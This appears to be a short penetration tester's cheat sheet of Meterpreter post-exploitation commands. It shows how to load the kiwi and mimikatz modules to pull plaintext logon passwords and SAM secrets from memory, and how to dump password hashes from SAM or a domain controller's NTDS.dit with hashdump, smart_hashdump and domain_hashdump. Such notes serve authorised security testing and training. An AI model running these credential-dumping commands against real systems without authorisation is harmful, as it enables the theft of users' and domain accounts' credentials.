# Tools - Metasploit/Meterpreter


I have no idea what the difference between kiwi and mimikatz is (none by the looks of it).

## kiwi


kiwi is a Mimikatz module.
Dumps credentials from memory.

From meterpreter session:
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"

## mimikatz


mimikatz is another Mimikatz module.
From meterpreter session:
load mimikatz
mimikatz_command -f "<command>"
mimikatz_command -f "sekurlsa::logonpasswords"

## Dump Hashes


hashdump
From meterpreter, dump from SAM

smart_hashdump
Clever dumping. Will grab from NTDS.dit if on Domain Controller
post/windows/gather/smart_hashdump

domain_hashdump
https://www.rapid7.com/db/modules/post/windows/gather/credentials/domain_hashdump
Run when on a domain controller.
Uses the NTDS.dit file to extract all Domain Users + hashes, including historical ones.
use post/windows/gather/credentials/domain_hashdump
